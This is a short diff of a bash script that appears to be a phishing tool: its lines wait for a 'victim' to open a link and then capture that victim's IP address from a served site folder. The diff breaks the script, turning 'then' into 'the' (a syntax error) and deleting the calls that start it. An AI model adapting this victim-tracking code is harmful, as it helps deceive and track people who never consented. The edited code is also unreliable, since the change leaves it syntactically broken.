@@ -444,7 +444,7 @@ printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting victim open the link ...\e
 while [ true ]; do
 
 
-if [[ -e "sites/$server/ip.txt" ]]; then
+if [[ -e "sites/$server/ip.txt" ]]; the
 printf "\n\e[1;92m[\e[0m*\e[1;92m] IP Found!\n"
 catch_ip
 
@@ -453,7 +453,4 @@ sleep 1
 done 
 
 }
-banner
-dependencies
-menu
 
